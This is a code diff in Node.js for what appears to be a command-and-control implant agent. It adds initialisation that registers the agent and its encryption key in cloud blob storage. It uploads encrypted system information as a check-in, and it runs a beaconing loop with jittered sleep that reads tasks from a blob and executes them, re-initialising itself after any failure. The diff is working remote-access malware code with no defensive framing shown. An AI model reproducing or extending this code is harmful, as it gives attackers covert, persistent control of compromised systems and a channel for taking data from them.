-        if (path.isAbsolute(newPath)) {
-            targetPath = newPath;
-        } else {
-            if (newPath.startsWith('./') || newPath.startsWith('.\\')) {
-                newPath = newPath.substring(2);
-            }
-            while (newPath.startsWith('../') || newPath.startsWith('..\\')) {
-                currentPath = path.dirname(currentPath);
-                newPath = newPath.substring(3);
-            }
-            targetPath = path.join(currentPath, newPath);
+        let response = null;
+        let blobs = global.agent.container.blobs;
+        // Create the metaContainer if it doesn't exist
+        debug(`[INIT] Creating metaContainer ${global.agent.metaContainer}`);
+        response = await func_Container_Create(global.agent.metaContainer);
+        if (response === false) {
+            debug(`[INIT][!] Failed to create meta container : ${global.agent.metaContainer}`);
+            return false;
         }
-        targetPath = path.normalize(targetPath);
-        try {
-            const stats = await fsp.stat(targetPath);
-            if (!stats.isDirectory()) {
-                return `[!] Error: ${targetPath} is not a directory`;
-            }
-        } catch (error) {
-            return `[!] Error: Directory ${targetPath} does not exist`;
+        // Create the metacontainer blob for this agent. Used to register the agent to the client dashboard table
+        debug(`[INIT] Creating metaContainer blob /${global.agent.metaContainer}/${global.agent.agentid}`);
+        response = await func_Blob_Create(global.agent.metaContainer, global.agent.agentid, global.agent.container.name);
+        if(response === false) {
+            debug(`[INIT][!] Failed to create meta container blob : ${global.agent.metaContainer} ${global.agent.agentid}`);
+            return false;
         }
-        global.agent.cwd = targetPath;
-        return `Changed directory to ${global.agent.cwd}`;
+        response = await Blob_Set_Metadata(
+          global.agent.metaContainer, 
+          global.agent.agentid, 
+          {
+            stat:      Date.now(),
+            signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
+            hash:      await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv)),
+            link:      global.agent.agentid
+          }
+        );
+        if(response.status != 200) {
+            debug(`[INIT][!] Failed to set metadata for meta container blob : ${global.agent.metaContainer} ${global.agent.agentid}`);
+            return false;
+        }
+        // Create agent container
+        debug(`[INIT] Creating agent container ${global.agent.container.name}`);
+        response = await func_Container_Create(global.agent.container.name);
+        if (response === false) {
+            debug(`[INIT][!] Failed to create agent container : ${global.agent.container.name}`);
+            return false;
+        }
+        // Create input blob
+        response = await func_Blob_Create(global.agent.container.name, blobs['in']);
+        if(response === false) {
+            debug(`[INIT][!] Failed to create container blob ${global.agent.container.name} ${blobs['in']}`);
+            return false;
+        }
+        // Create checkin blob
+        let selfInfo = await getSystemInfo();
+        const checkin_encryptedData = await func_Encrypt(JSON.stringify(selfInfo, null, 1), global.agent.container.key.key, global.agent.container.key.iv);
+        const checkin_b64EncData = await func_Base64_Encode(checkin_encryptedData);
+        response = await func_Blob_Create(global.agent.container.name, blobs['checkin'], checkin_b64EncData);
+        if(response === false) {
+            debug(`[INIT][!] Failed to create container blob ${global.agent.container.name} ${blobs['checkin']}`);
+            return false;
+        }
+        return true;
     } catch (error) {
-        debug(`[!] Error in func_cd: ${error.message}${error.stack}`);
-        return `[!] Error changing directory: ${error.message}`;
+        debug(`[INIT][!] ERROR : \r\n${error}\r\n ${error.stack}`);
+        return false;
+    }
+}
+
+async function reinitializeAgent() {
+  debug(`[REINIT] Reinitializing agent`);
+  global.init = false;
+  let failattempts = 0;
+
+  while (true) {
+      let initResult = await init();
+      if (initResult === true) {
+          debug('[REINIT] Initialization successful');
+          break;
+      }
+      else{
+          failattempts++;
+          debug(`[REINIT] Initialization failed for ${failattempts} time, retrying in 10 seconds... `);
+          await new Promise(resolve => setTimeout(resolve, 10000));
+      }
+  }
+}
+
+async function TaskLoop() {
+  try{
+    debug(`[TASKLOOP] Starting task handler`);
+    while (true) {
+        if (!global.init) {
+            let agentidresp = await func_Blob_Read(global.agent.metaContainer, global.agent.agentid);
+            debug(`[TASKLOOP] func_Blob_Read response : ${JSON.stringify(agentidresp)}`);
+            if (agentidresp.status === 200) {
+                if (agentidresp.data == global.agent.container.name) {
+                    debug(`[TASKLOOP] Agents metaContainer global.agent.agentid ${global.agent.agentid} is initialized with value ${agentidresp.data}`);
+                    global.init = true;
+                }
+            }
+
+        }else{
+            let response = await Blob_Set_Metadata(
+              global.agent.metaContainer, 
+              global.agent.agentid, 
+              {
+                stat:      Date.now(),
+                signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
+                hash:      await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv)),
+                link:      global.agent.agentid
+              }
+            );
+            if (global.mode== 'link-tcp' && response === false) {
+                debug(`[TASKLOOP] ${global.TCPServer.authenticatedClients.size} clients authenticated.\r\n Waiting for client to connect and authenticate...`);
+                const clientConnected = await global.TCPServer.waitForClient();
+                if (clientConnected) {
+                  debug('Client connected and authenticated successfully');
+                  debug(`[TASKLOOP] ClientConnected : ${clientConnected}`);
+                }
+            }
+            if (response != false) {
+              if(response.status != 200) { 
+                await reinitializeAgent(); 
+              }
+              if( await HandleTask() === false) 
+              { 
+                await reinitializeAgent(); 
+              }
+            }
+        }
+        if (900 * 1000 > global.agent.thissleep && global.agent.thissleep > 1 * 888) {
+            global.agent.thissleep = await getrand(global.agent.sleepinterval * 1000, global.agent.sleepjitter);
+            debug(`[TASKLOOP] Sleeping for ${global.agent.thissleep}`);
+            await new Promise(resolve => setTimeout(resolve, global.agent.thissleep));
+        } else {
+            debug('[TASKLOOP] Sleeping for default 10 seconds');
+            await new Promise(resolve => setTimeout(resolve, 10000));
+        }
+    }
+  }catch(error){
+    debug(`${error} ${error.stack}`);
+    await TaskLoop();
+  }
+}
+
+async function HandleTask() {
+    try {
+        let response = await func_Blob_Read(global.agent.container.name ,global.agent.container.blobs['in']);
+        if (response.status === 200) {
+            await clearBlob(global.agent.container.name, global.agent.container.blobs['in']);
+            if (response.data && response.data != null && response.data != undefined && response.data != "") {
+                let task = await parseTask(response.data);
+                await DoTask(task);
+            } 
+            return true;
+        }else{
+            return false;
+        }
+    } catch (error) {
+        debug(`[!] ${error} ${error.stack}`);
+        return false;
     }
 }
